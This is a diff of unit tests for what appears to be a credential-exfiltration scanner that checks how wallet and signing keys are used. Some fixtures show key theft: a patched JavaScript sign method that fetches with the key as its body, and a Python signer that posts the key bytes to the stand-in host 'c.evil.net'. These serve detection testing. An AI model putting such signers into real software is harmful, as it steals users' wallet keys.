@@ -5,11 +5,14 @@ from __future__ import annotations
 
 import re
 
-from src.scanner.credential_flow import _mask_signing, credential_exfil_hits
+from src.scanner.credential_flow import _mask_signing, _SignCtx, credential_exfil_hits
 from src.scanner.npm_scripts import (
     SIGNATURE_WHY,
+    SIGNING_WHY,
     mark_signature,
+    mark_signing,
     restore_signature_hosts,
+    restore_signing_relaxed,
 )
 from src.scanner.signature_lists import signature_array_entry
 from src.scanner.skill_key_flow import VENDOR_KEYS, host_is_own_vendor
@@ -124,18 +127,49 @@ def test_sink_helper_is_judged_per_parameter():
 
 # ── (b) signed payload ───────────────────────────────────────────────────────────────
 
+SOLDERS_IMPORT = "from solders.transaction import Transaction\n"
+
+
 def test_mask_signing_blanks_only_bare_and_public_uses():
+    ctx = _SignCtx(SOLDERS_IMPORT, True)
     code = "tx = Transaction([payer], [ix], bh)"
-    assert "payer" not in _mask_signing(code, {"payer"})
+    assert "payer" not in _mask_signing(code, {"payer"}, ctx)
     assert "payer" not in _mask_signing("m = AccountMeta(payer.pubkey(), True)", {"payer"})
+    # The key as the RECEIVER is excused whatever the signer.
     assert "payer" not in _mask_signing("sig = payer.sign_message(msg)", {"payer"})
     for keep in ("tx = Transaction([payer], [Instruction(P, bytes(payer), [])], bh)",
                  "s = payer.sign_message(payer.secret())",
-                 "tx.sign(kp, kp.secretKey)",
                  "x = Transaction([payer], [payer.to_bytes()], bh)"):
-        assert "payer" in _mask_signing(keep, {"payer"}) or "kp" in _mask_signing(keep, {"kp"})
+        assert "payer" in _mask_signing(keep, {"payer"}, ctx)
+    assert "kp" in _mask_signing("tx.sign(kp, kp.secretKey)", {"kp"}, ctx)
     # Not a key object: untouched.
-    assert _mask_signing(code, {"other"}) == code
+    assert _mask_signing(code, {"other"}, ctx) == code
+
+
+def test_argument_key_needs_a_resolved_unredefined_library_signer():
+    code = "tx = Transaction([payer], [ix], bh)"
+    # No import of Transaction from a signing library: unresolved, the key stays.
+    assert "payer" in _mask_signing(code, {"payer"}, _SignCtx("import json\n", True))
+    assert "payer" in _mask_signing(code, {"payer"}, None)
+    # Imported, but the package defines / reassigns it here.
+    for redef in ("class Transaction:\n    pass\n", "Transaction = Evil\n",
+                  "solders.transaction.Transaction = Evil\n"):
+        ctx = _SignCtx(SOLDERS_IMPORT + redef, True)
+        assert "payer" in _mask_signing(code, {"payer"}, ctx), redef
+    # `uploader.sign(kp)`: the receiver is no library object.
+    js = "const { Transaction } = require('@solana/web3.js');\nconst up = makeUploader();\n"
+    assert "kp" in _mask_signing("up.sign(kp)", {"kp"}, _SignCtx(js, False))
+    # A library object whose method the file redefines.
+    js_tx = "const { Transaction } = require('@solana/web3.js');\nconst tx = new Transaction();\n"
+    assert "kp" not in _mask_signing("tx.sign(kp)", {"kp"}, _SignCtx(js_tx, False))
+    patched = js_tx + "Transaction.prototype.sign = function (k) { fetch(u, {body: k}) };\n"
+    assert "kp" in _mask_signing("tx.sign(kp)", {"kp"}, _SignCtx(patched, False))
+    reassigned = js_tx + "tx = makeEvil();\n"
+    assert "kp" in _mask_signing("tx.sign(kp)", {"kp"}, _SignCtx(reassigned, False))
+    # nacl / tweetnacl: the module must be imported from the library.
+    nacl = "const nacl = require('tweetnacl');\n"
+    assert "kp" not in _mask_signing("s = nacl.sign(msg, kp)", {"kp"}, _SignCtx(nacl, False))
+    assert "kp" in _mask_signing("s = nacl.sign(msg, kp)", {"kp"}, _SignCtx("", False))
 
 
 SOL = '''import json, urllib.request
@@ -153,10 +187,57 @@ def send(ix, bh):
 
 
 def test_signed_transaction_is_not_the_wallet():
-    assert credential_exfil_hits(SOL.replace("EXTRA", "1"), "python") == []
+    relaxed: list = []
+    assert credential_exfil_hits(SOL.replace("EXTRA", "1"), "python", relaxed=relaxed) == []
+    # The excuse is reported for the tree pass, with the signer it relied on.
+    assert relaxed and relaxed[0][1] == "wallet" and relaxed[0][2] == ["Transaction"]
     for leak in ("bytes(payer).hex()", "str(payer.secret())", "payer.to_json()",
                  "list(secret)"):
         assert credential_exfil_hits(SOL.replace("EXTRA", leak), "python"), leak
+
+
+def test_package_defined_signers_keep_the_key():
+    own = SOL.replace("from solders.transaction import Transaction\n",
+                      "class Transaction:\n    def __init__(self, s, i, b):\n"
+                      "        self.s = s\n")
+    assert credential_exfil_hits(own.replace("EXTRA", "1"), "python")
+    sender = SOL.replace("    tx = Transaction(", "    sender.sign(payer)\n    tx = Transaction(")
+    sender = sender.replace("def send(", "class S:\n    def sign(self, k):\n"
+                            "        return urllib.request.urlopen(\n"
+                            "            urllib.request.Request('https://c.evil.net', data=bytes(k)))\n"
+                            "\n\nsender = S()\n\n\ndef send(")
+    assert credential_exfil_hits(sender.replace("EXTRA", "1"), "python")
+
+
+def test_signing_restore_when_another_file_redefines_the_signer():
+    def marked():
+        f = _F("bridge.py")
+        mark_signing(f, "critical", {"Transaction"})
+        return f
+
+    f = marked()
+    restore_signing_relaxed([f], {"bridge.py": SOL, "util.py": "def helper():\n    pass\n"})
+    assert (f.severity, f.remediation) == ("low", SIGNING_WHY)
+    for other in ("import solders.transaction\nsolders.transaction.Transaction = X\n",
+                  "class Transaction:\n    pass\n",
+                  "setattr(mod, 'Transaction', X)\n"):
+        f = marked()
+        restore_signing_relaxed([f], {"bridge.py": SOL, "boot.py": other})
+        assert f.severity == "critical", other
+    f = marked()
+    restore_signing_relaxed([f], {})
+    assert f.severity == "critical"
+
+
+def test_own_vendor_key_use_is_disclosed():
+    uses: list = []
+    assert credential_exfil_hits(GUARDED, "python", vendor_uses=uses) == []
+    assert uses == [(10, "zorble.io")]
+    from src.scanner.scan import _credential_exfil_findings
+    fs = _credential_exfil_findings(GUARDED, "server.py", GUARDED.splitlines(), "python",
+                                    set(), payload=False)
+    assert [(f.name, f.kind, f.severity) for f in fs] == [
+        ("Uses your zorble.io API key", "capability", "low")]
 
 
 def test_a_key_object_reassigned_from_raw_bytes_is_not_a_key_object():
